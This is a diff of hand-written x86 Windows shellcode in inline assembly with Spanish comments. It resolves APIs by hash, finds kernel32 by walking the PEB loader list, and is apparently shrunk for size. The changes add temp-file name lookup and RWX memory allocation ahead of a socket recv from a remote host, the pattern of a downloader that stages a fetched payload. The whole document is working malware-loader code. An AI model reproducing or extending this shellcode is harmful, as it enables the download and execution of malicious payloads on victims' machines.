@@ -26,13 +26,15 @@ void __declspec(naked) main(){
         *###############################################################################*/
 #pragma region hashes
 kernel32_symbol_hashes:
-        #define kernel32_count  6
+        #define kernel32_count  8
         API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A') )
         API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s') )
         API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p') )
         API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s') )
         API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
         API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A') )
+        API_DEFINE(GetTempPathA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('P') ('a') ('t') ('h') ('A') )
+        API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A') )
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    8
@@ -177,17 +179,17 @@ Redo:
         *###############################################################################*/
 
         //Obtenemos en eax la dirección de kernel32
-        xor  eax, eax
-        mov  esi, FS:[eax+0x30]         //ESI = &(PEB)
-        mov  esi, [esi+0x0C]            //ESI = PEB->Ldr
+        push 0x30                       //v
+        pop  esi                        //v
+        lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
+        mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
+        mov  eax, [esi+0x20]            //EAX = PEB->Ldr.InInitOrder[X].module_name (unicode)
+        cmp  [eax+0xC], '3'             //module_name[6] == '3'?
         mov  eax, [esi+0x08]            //EAX = PEB->Ldr.InInitOrder[X].base_address
-        mov  ecx, [esi+0x20]            //EDI = PEB->Ldr.InInitOrder[X].module_name (unicode)
-        cmp  [ecx+0xC], '3'             //module_name[6] == '3'?
-        je   find_kernel32_finished
-        mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink == NextModule
-        jmp  next_module
+        mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink (NextModule)
+        jne  next_module
 find_kernel32_finished:
 
         movr(ecx, LoadFunctions)
@@ -230,7 +232,7 @@ find_kernel32_finished:
         sub  ebp, (kernel32_count + ws2_32_count + advapi32_count)*4
 
         #ifdef MUTEX
-        push [ebp+_pHOST]                //v
+        push [ebp+_pHOST]               //v
         cdq                             //EDX = 0
         push edx                        //v
         push edx                        //v
@@ -250,18 +252,37 @@ nomtx:
         #endif
         #endif
 
-        //Creamos el buffer donde recibiremos toda la información
-        #define BUFF_SIZE   0x10000
+        jmp  end_createBuff
+        
+CreateBuff:
         cdq                             //EDX = 0
         push PAGE_EXECUTE_READWRITE     //v
         pushc(MEM_COMMIT)               //v
-        pushc(BUFF_SIZE)                //v
+        push eax                        //v
         push edx                        //v
-        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, BUFF_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
         #ifdef ERR_CHECK
         push ERR_MEM                    //v
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
         #endif
+        ret
+end_createBuff:
+
+        push 512                        //v
+        pop  eax                        //EAX = 512
+        call CreateBuff                 //Creamos Buffer para la ruta
+        mov  edi, eax                   //ECX = EAX
+
+        cdq                             //EDX = 0
+        push ecx
+        push edx
+        push edx
+        push edi
+        call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
+
+#define BUFF_SIZE 0x1010101
+_cont:  mov  eax, BUFF_SIZE             //EAX = BUFF_SIZE
+        call CreateBuff
         mov  [ebp+_pBuff], eax          //pBuffer = EAX
 
         /*###############################################################################
@@ -361,7 +382,7 @@ connected:
 recibir:
         cdq                             //EDX = 0
         push edx                        //v
-        pushc(BUFF_SIZE)                //v
+        push BUFF_SIZE                  //v
         push [ebp+_pBuff]               //v
         push [ebp+_hSocket]             //v
         call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);
